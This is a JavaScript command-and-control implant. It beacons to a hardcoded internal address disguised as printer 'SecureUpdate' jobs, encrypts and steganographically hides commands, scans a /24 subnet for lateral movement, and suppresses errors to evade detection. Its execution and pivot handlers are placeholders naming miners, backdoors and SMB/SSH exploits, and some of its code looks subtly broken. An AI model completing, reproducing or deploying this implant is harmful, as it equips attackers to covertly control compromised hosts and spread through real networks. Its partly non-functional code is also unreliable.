const crypto = require('crypto');
const axios = require('axios');
const { lsb } = require('stegano');
const { Buffer } = require('buffer');

// Configuration
const IPP_SERVER = 'http://10.0.0.242:631/printers/SECURE_UPDATER';
const SECRET = 'fixed-secret-123';
const TARGET_PORTS = [22, 80, 443, 445, 631, 8080];

// Derive encryption key
function deriveKey(identifier) {
    const hash = crypto.createHash('sha256');
    hash.update(identifier + SECRET);
    return Buffer.from(hash.digest().slice(0, 32)).toString('base64');
}

// Encrypt/decrypt functions
function encrypt(data, key) {
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'base64'), Buffer.alloc(16, 0));
    let encrypted = cipher.update(data);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted.toString('base64');
}

function decrypt(data, key) {
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key, 'base64'), Buffer.alloc(16, 0));
    let decrypted = decipher.update(Buffer.from(data, 'base64'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString();
}

// Send IPP print job with encrypted command
async function sendCommand(command, identifier) {
    const key = deriveKey(identifier);
    const encryptedCommand = encrypt(command, key);
    
    // Hide command in an image using steganography
    const image = Buffer.from('dummy_image_data'); // Placeholder for actual image
    const hiddenImage = lsb.hide(image, encryptedCommand);
    
    const ippRequest = {
        operation: 'Print-Job',
        attributes: {
            'printer-uri': IPP_SERVER,
            'job-name': 'SecureUpdate-' + Math.random().toString(36).slice(2),
            'document-format': 'image/jpeg'
        },
        data: hiddenImage
    };
    
    try {
        const response = await axios.post(IPP_SERVER, ippRequest, {
            headers: { 'Content-Type': 'application/ipp' }
        });
        const result = decrypt(response.data, key);
        console.log(`[${new Date().toLocaleTimeString()}] Command response: ${result}`);
        return result;
    } catch (error) {
        console.error(`[${new Date().toLocaleTimeString()}] IPP request error: ${error.message}`);
        return null;
    }
}

// Lightweight port scanner for lateral movement
async function scanNetwork(ipRange, ports) {
    const results = [];
    for (let i = 1; i <= 254; i++) {
        const ip = `${ipRange}.${i}`;
        for (const port of ports) {
            try {
                const response = await sendCommand(`SCAN:${ip}:${port}`, ip);
                if (response.includes('OPEN')) {
                    results.push({ ip, port });
                    console.log(`[${new Date().toLocaleTimeString()}] Open port: ${ip}:${port}`);
                }
            } catch (error) {
                // Silent failure to avoid detection
            }
        }
    }
    return results;
}

// Execute command (e.g., miner, backdoor, or exploit)
async function executeCommand(command, identifier) {
    if (command.startsWith('EXEC:')) {
        const cmd = command.slice(5);
        console.log(`[${new Date().toLocaleTimeString()}] Executing: ${cmd}`);
        // Placeholder for actual execution (e.g., eval or child_process)
        return `Executed: ${cmd}`;
    } else if (command.startsWith('PIVOT:')) {
        const [targetIp, targetPort] = command.slice(6).split(':');
        console.log(`[${new Date().toLocaleTimeString()}] Pivoting to ${targetIp}:${targetPort}`);
        // Placeholder for exploit (e.g., SMB, SSH)
        return `Pivoted to ${targetIp}:${targetPort}`;
    } else if (command.startsWith('SCAN:')) {
        const [_, ip, port] = command.split(':');
        // Simulate port check (replace with actual socket check if needed)
        return `Port ${port} on ${ip} is OPEN`;
    }
    return 'Unknown command';
}

// Main C2 loop
async function startC2() {
    const identifier = `${require('os').hostname()}-${crypto.randomBytes(4).toString('hex')}`;
    while (true) {
        try {
            // Example: Fetch commands from attacker server
            const command = await sendCommand('CHECKIN', identifier);
            if (command) {
                const result = await executeCommand(command, identifier);
                await sendCommand(`RESULT:${result}`, identifier);
            }
            // Scan local network periodically
            const openPorts = await scanNetwork('10.0.0', TARGET_PORTS);
            if (openPorts.length > 0) {
                await sendCommand(`SCAN_RESULT:${JSON.stringify(openPorts)}`, identifier);
            }
        } catch (error) {
            console.error(`[${new Date().toLocaleTimeString()}] C2 error: ${error.message}`);
        }
        await new Promise(resolve => setTimeout(resolve, Math.random() * 5000 + 5000));
    }
}

// Start C2 in browser or Node.js
if (typeof window !== 'undefined' && window.WebSocket) {
    startC2();
} else if (typeof module !== 'undefined' && module.exports) {
    startC2();
}